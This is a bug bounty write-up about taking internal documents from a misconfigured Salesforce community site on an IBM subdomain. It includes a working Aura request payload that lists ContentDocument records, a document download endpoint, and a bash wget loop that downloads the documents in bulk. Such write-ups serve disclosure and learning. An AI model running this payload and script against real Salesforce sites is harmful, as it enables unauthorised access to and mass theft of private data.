---
title: "How I was able to access IBM internal documents"
classes: wide
header:
  teaser: /assets/images/crackmes/crit.PNG
ribbon: DodgerBlue
description: "How to exploit Salesforce misconfiguration in the wild"
categories:
  - bugbounty
toc: true
---

Hi, today I will share how I was able to access internal data of https://weathercommunity.ibm.com using salesforce misconfiguration.

This write-up will depends n this great blog: [ Salesforce](https://web.archive.org/web/20210125200757/https://www.enumerated.de/salesforce)

so please read it first then read this write-up.

After I read this blog, I wanted to exploit it in the wild so I now I wanted to see the subdomains which point to on of the following CNAMEs:

*.force.com

*.secure.force.com

*live.siteforce.com

I used this great tool https://github.com/yghonem14/cngo to get CNMAEs of all the websites that have program 
on hackerone through https://chaos.projectdiscovery.io/

I found this subdomain **weathercommunity.ibm.com** which pointing out to: **thercommunity.ibm.com.00de0000000avgcma2.live.siteforce.com**

I found an endpoint like:
     
![](/assets/images/crackme/0690h000007Aly3AAC.png)

then I sent this POST request to the Repeater and changed the ***Message*** parameter value to:
```
{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"MARKER","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}

```
Replacing the ***MARKER*** string with:

***ContentDocument***

![](/assets/images/crackmes/ibm1.png)

See that there are more than 900 ID.
I extracted the ID value which started with 069 and made a simple bash script to download them one by one
through this endpoint /sfc/servlet.shepherd/document/download/$ID

https://weathercommunity.ibm.com/sfc/servlet.shepherd/document/download/ID

Example: 

https://weathercommunity.ibm.com/sfc/servlet.shepherd/document/download/0690h0000060wuHAAQ

```
while read i
do wget --no-check-certificate "https://weathercommunity.ibm.com/sfc/servlet.shepherd/document/download/$i"
done < $1

```

Sample of the internal images:

![]()

![](/assets/images/crackmes/0690h000007Aly3AAC.png)


***Final word:**
you will not understand anything if you did not read the blog [ Salesforce](https://web.archive.org/web/20210125200757/https://www.enumerated.de/salesforce) first as he explained everything in it.
